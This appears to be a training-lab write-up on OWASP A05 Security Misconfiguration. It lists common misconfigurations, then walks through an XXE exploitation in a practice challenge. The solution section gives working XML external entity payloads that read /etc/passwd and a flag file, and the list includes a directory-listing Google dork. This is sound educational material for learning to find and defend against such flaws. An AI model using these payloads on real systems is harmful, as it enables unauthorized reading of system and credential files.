---
icon: sliders-up
---

# A05 - Security Misconfiguration

Security misconfigurations are a widespread issue, leaving systems vulnerable to attack. Studies show that approximately 90% of applications tested have misconfiguration issues, often due to insecure default settings.

### Examples of Common Security Misconfigurations

1. **Improper XML Parser Configuration**: If not securely configured, XML parsers are vulnerable to attacks like XML External Entity (XXE) injection.
2. **Default Passwords**: Default credentials left unchanged can easily allow unauthorized access.
3. **Directory Listing Not Disabled**: When directory listing is enabled on a server, attackers can browse and view all files in a directory. This is often exploitable using techniques like Google Dorking with queries such as `intitle:index of`.
4. **Outdated Default Applications on Production Servers**: Default or sample applications that are shipped with application servers can expose vulnerabilities if not removed. Attackers can exploit known flaws in these applications. If one of these applications includes an admin console with unchanged default credentials, attackers can easily gain control.
5. **Session Cookies Missing HttpOnly and Secure Flags**: Without these flags, session cookies are vulnerable to interception and theft, exposing users to risks like cross-site scripting (XSS).
6. **Lack of Security Headers**: Missing essential security headers (e.g., Content Security Policy, X-Content-Type-Options) increases susceptibility to attacks like cross-site scripting and content sniffing.

### Solution

In this example, we have a page that parses XML data and displays the contents. This setup is vulnerable to XXE attacks, allowing an attacker to manipulate XML data to access sensitive files. Here’s how we exploit this vulnerability:

**1) Testing for Basic XXE**: We use the following payload to verify if XXE is possible:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
   <firstName>John</firstName>
   <lastName>&example;</lastName>
</userInfo>
```

If successful, this payload should replace the `lastName` element with `Doe`, confirming the page is vulnerable.

**2) Exploiting XXE to Access Sensitive Files**: Now that we’ve confirmed the vulnerability, we can attempt to read system files with the following payload:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
   <firstName>John</firstName>
   <lastName>&xxe;</lastName>
</userInfo>
```

This payload retrieves the contents of `/etc/passwd`.

**3) Retrieving the Flag**: Finally, to capture the target flag file, we use the following payload:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/flag_xxe.txt"> ]>
<userInfo>
   <firstName>John</firstName>
   <lastName>&xxe;</lastName>
</userInfo>
```

This payload displays the contents of `/etc/flag_xxe.txt`, providing us with the flag.
